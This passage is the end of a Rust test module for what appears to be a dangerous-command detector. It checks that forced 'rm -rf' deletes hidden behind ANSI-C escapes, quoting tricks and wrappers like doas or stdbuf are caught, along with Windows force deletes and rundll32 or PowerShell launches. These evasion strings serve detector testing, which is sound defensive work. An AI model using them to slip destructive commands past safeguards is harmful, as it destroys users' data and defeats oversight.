        assert_eq!(bash("env -S 'echo safe'"), None);
    }

    #[test]
    fn ansi_c_escapes_double_quote_escapes_and_windows_shell_execute_are_detected() {
        // ANSI-C $'...' hex, unicode, octal, control, and named escapes hiding `rm -rf`.
        for s in [
            r"$'\x72\x6d' -rf /tmp/x",
            r"$'\u0072\U0000006d' -rf /tmp/x",
            r"$'\162\155' -rf /tmp/x",
            r#"$'\a\b\e\E\f\n\r\t\v\'\"\?\\\cA\x\u\q'; rm -rf /tmp/x"#,
            "\"r\\\"m\" ; \"\\$x\" ; rm -rf /tmp/x",
            "doas -u root rm -rf /tmp/x",
            "stdbuf -o 0 rm -rf /tmp/x",
            "rm -rf /tmp/x \\\n  /tmp/y",
        ] {
            assert_eq!(bash(s), Some(Match::ForcedRm), "{s}");
        }
        // `--` stops option parsing so `rm -- -rf` is NOT forced rm.
        assert_eq!(bash("rm -- -rf"), None);

        // Windows force delete & ShellExecute URL launch via cmd / rundll32 / PowerShell.
        assert_eq!(Match::WindowsShellExecute.name(), "windows_shell_execute");
        assert_eq!(dangerous("del /f foo.txt", false, true), Some(Match::WindowsForceDelete));
        assert_eq!(dangerous("cmd /c start https://example.com", false, true), Some(Match::WindowsShellExecute));
        assert_eq!(
            dangerous("rundll32 url.dll,FileProtocolHandler file:///C:/evil.exe", false, true),
            Some(Match::WindowsShellExecute)
        );
        assert_eq!(
            dangerous("pwsh -Command 'Remove-Item ''foo'' -Force'", false, false),
            Some(Match::WindowsForceDelete)
        );
        assert_eq!(dangerous("pwsh -Command \"rd /s /q build\"", false, false), Some(Match::WindowsForceDelete));
        assert_eq!(
            dangerous("pwsh -EncodedCommand:invalid_odd!", false, false),
            Some(Match::WindowsForceDelete),
            "undecodable -EncodedCommand must fail closed"
        );
    }
}
